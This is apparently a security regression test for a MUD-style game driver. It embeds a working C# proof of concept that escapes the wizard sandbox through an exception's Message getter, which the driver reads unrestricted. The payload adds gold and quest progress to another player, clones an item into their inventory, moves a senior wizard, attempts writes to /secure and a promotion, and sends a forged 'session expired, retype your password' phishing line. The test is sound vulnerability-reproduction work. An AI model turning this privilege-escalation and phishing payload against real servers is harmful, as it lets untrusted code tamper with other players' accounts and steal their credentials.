#!/usr/bin/env python3
"""F2: a sandbox exception wrapped in a framework exception (AggregateException) crosses every domain boundary unconverted. The
driver reads its Message in ReportError after it has cleared the call stack and ThisPlayer, so the sandbox Message getter runs
UNRESTRICTED: it reaches any real object (gold, experience, quests of an ordinary player), sends them text, and clones a real item
straight into their inventory, and the victim's save file keeps it.

Expected after a fix: every check passes (nothing reaches Pat)."""
import os
import time
import rtlib

BOMB = r'''// @inherit /std/item
public class WrenBomb : Item
{
    public static string Log = "";
    public override void Create() { Name = "bomb"; Ids.Add("bomb"); ShortDesc = "a sandbox bomb"; }
    public override void Init()
    {
        base.Init();
        AddAction("rtwindow", a => { throw new AggregateException("x", new Payload(this)); });
    }
    // Runs from the exception's Message, called by the driver with nothing on its call stack.
    public string Fire()
    {
        var pat = Users().FirstOrDefault(u => (u.Call<string>("QueryName") ?? "") == "Pat");
        if (pat == null) return "nopat";
        var r1 = pat.Call("AddGold", 4242);
        var r2 = pat.Call("SetQuest", "rt_quest", 7);
        TellObject(pat, "FORGED-TEXT: [System] Your session expired. Please type your password again.\n");
        string r3;
        try { var relic = CloneObject("/domains/rt/relic"); MoveObject(relic, pat); r3 = "moved:" + relic.Domain; }
        catch (Exception e) { r3 = "ERR:" + e.Message; }
        string r4;
        var chief = Users().FirstOrDefault(u => (u.Call<string>("QueryName") ?? "") == "Chief");
        try { if (chief != null) MoveObject(chief, LoadObject("/wiz/wren/lab")); r4 = "dragged"; }
        catch (Exception e) { r4 = "ERR:" + e.Message; }
        string r5, r6, r7;
        try { WriteFile("/secure/hacked.cs", "// x"); r5 = "written"; } catch (Exception e) { r5 = "ERR"; }
        r6 = LoadObject("/secure/wizlist").Call("Promote", "pat", 1)?.ToString() ?? "null";
        try { r7 = CheckAdminSecret("guess").ToString(); } catch (Exception e) { r7 = "ERR"; }
        Log = $"writefile={r5} promote={r6.Replace(" ", "_")} secret={r7} chief={r4} gold={r1} quest={r2} relic={r3} restricted={(RestrictedCaller() == null ? "no" : "yes")}";
        return Log;
    }
}
public class Payload : Exception
{
    private readonly WrenBomb owner;
    public Payload(WrenBomb owner) { this.owner = owner; }
    public override string Message => "payload " + owner.Fire();
}
'''


def main():
    g = rtlib.Game(wiz_files={"/wiz/wren/bomb": BOMB})
    g.start()
    try:
        g.setup_people()
        before = g.dump("pat")
        print("before:", before.strip())
        g.wren.command("goto /wiz/wren/lab")
        print(g.wren.command("clone /wiz/wren/bomb").strip())
        out = g.wren.command("rtwindow")
        print("wren sees:", out.strip()[:400])
        time.sleep(0.5)
        patview = g.pat.command("look")
        after = g.dump("pat")
        print("after:", after.strip())
        rtlib.check("F2: sandbox code cannot add gold to an ordinary player", "gold=4262" not in after, after)
        rtlib.check("F2: sandbox code cannot set an ordinary player's quest", "quest=7" not in after, after)
        rtlib.check("F2: sandbox code cannot put a real item into an ordinary player's hands", "/domains/rt/relic[real]" not in after, after)
        rtlib.check("F2: sandbox code cannot print text on an ordinary player's screen", "FORGED-TEXT" not in patview, patview)
        g.pat.command("quit", marker="Goodbye", timeout=5)
        time.sleep(0.5)
        save = os.path.join(g.work, "save", "players", "pat.json")
        text = open(save).read() if os.path.exists(save) else ""
        rtlib.check("F2: nothing of it reaches the victim's save file", "4242" not in text and "rt/relic" not in text, text[:600])
        chief = g.chief.command("look")
        rtlib.check("F2: sandbox code cannot drag a level 10 wizard into its workshop", "Wren's Lab" not in chief, chief)
        rtlib.check("F2: the driver is still running", g.alive())
    finally:
        g.stop()
    rtlib.finish()


if __name__ == "__main__":
    main()
